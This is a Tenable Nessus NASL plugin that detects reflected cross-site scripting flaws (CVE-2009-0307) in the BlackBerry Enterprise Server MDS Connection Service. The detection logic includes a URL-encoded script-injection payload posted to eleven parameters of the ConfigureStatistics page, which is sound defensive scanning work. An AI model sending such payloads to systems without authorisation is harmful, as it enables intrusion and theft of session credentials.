#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(38199);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2009-0307");
  script_bugtraq_id(34573);
  script_xref(name:"SECUNIA", value:"34740");

  script_name(english:"BlackBerry Enterprise Server MDS Connection Service XSS");

  script_set_attribute(attribute:"synopsis", value:
"The remote Windows application is affected by cross-site scripting
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running the BlackBerry Enterprise Server MDS
Connection Service.  The installed version is affected by cross-site
scripting vulnerabilities involving the 'customDate', 'interval',
'lastCustomInterval', 'lastIntervalLength', 'nextCustomInterval',
'nextIntervalLength', 'action', 'delIntervalIndex', 'addStatIndex',
'delStatIndex', and 'referenceTime' parameters of the
'admin/statistics/ConfigureStatistics' script.  An attacker can
leverage these in order to execute arbitrary script code or steal
cookie-based authentication credentials.");
  # https://salesforce.services.blackberry.com/kbredirect/microsites/search.do?cmd=displayKC&externalId=KB17969
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?542ac24d");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/502746/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Upgrade to BlackBerry Enterprise Server 4.1.6 MR5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/04/28");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:rim:blackberry_enterprise_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl", "blackberry_es_installed.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8080, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss"))
  exit(0, "The web server on port "+port+" is vulnerable to cross-site scripting");

postdata = string(
  "customDate=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "interval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "lastCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "lastIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "nextCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "nextIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "action=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "delIntervalIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "addStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "delStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "referenceTime=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E"
);

exploit_res = string(
  '>"', "'", '><script>alert("nessus")</script>');

res = http_send_recv3(port:port, item:"/admin/statistics/ConfigureStatistics", method:"GET");
if (isnull(res)) exit(0);

if ("BlackBerry&#xAE; Mobile Data Service Connection Service" >< res[2] &&
    "Page generated by MDS-CS" >< res[2])
{
  req = http_mk_post_req(
    port        : port,
    item        : "/admin/statistics/ConfigureStatistics",
    add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
    data        : postdata
  );
 
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);
  
  # There's a problem if we see our exploit in the result
  if ("invalid action specified:" >< res[2] &&
      exploit_res >< res[2])
  {
    if (report_verbosity>0)
    {
      req_str = http_mk_buffer_from_req(req:req);
  
      report = string(
        "\n",
        "Nessus was able to exploit this issue using the following request : \n",
        "\n",
        "  ", str_replace(find:'\n', replace:'\n  ', string:req_str), "\n",
        "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    set_kb_item(name:'www/'+port+'XSS', value:TRUE);
  }
}
